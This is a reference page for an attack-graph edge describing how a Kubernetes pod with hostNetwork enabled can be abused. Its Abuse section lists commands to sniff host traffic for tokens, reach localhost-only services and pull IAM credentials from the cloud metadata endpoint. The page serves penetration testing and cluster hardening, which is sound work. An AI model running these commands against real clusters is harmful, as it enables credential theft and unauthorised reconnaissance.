# podHostNetwork

## Edge Schema

- **Source:** [Pod](../NodeDescriptions/Pod.md)
- **Target:** [Node](../NodeDescriptions/Node.md)

## General Information

The Pod runs with `hostNetwork: true`, sharing the Node's network namespace and enabling access to all network interfaces and locally bound services on the host.

## Abuse

With the host network stack, the pod bypasses all network policies (which apply to pod interfaces, not the host interface) and can sniff traffic on any host interface, reach locally bound services not exposed externally, and perform reconnaissance from the node's IP. Traffic sniffing is particularly high value — service account tokens and credentials transmitted over unencrypted channels within the cluster are recoverable this way.

```bash
# Enumerate host network interfaces and routes
ip addr
ip route

# Sniff traffic on a host interface for credentials and tokens
tcpdump -ni <interface> -s0 -w capture.pcap

# Reach services bound to localhost only
curl http://127.0.0.1:<port>

# Access IMDS directly (no hop-limit concern unlike standard pods)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

## References

- [BishopFox badPods - hostNetwork](https://github.com/BishopFox/badPods/tree/main/manifests/hostnetwork)
- [Kubernetes hostNetwork](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [HackTricks - hostNetwork](https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/escaping-from-kubernetes/kubernetes-node-local-privilege-escalation#hostnetwork)
- [OWASP K01 - Insecure Workload Configurations](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K01-Insecure-Workload-Configurations.html)
- [OWASP K05 - Missing Network Segmentation Controls](https://owasp.org/www-project-kubernetes-top-ten/2025/en/src/K05-Missing-Network-Segmentation-Controls.html)
- [Threat Matrix - Cluster Internal Networking](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Cluster%20internal%20networking/)
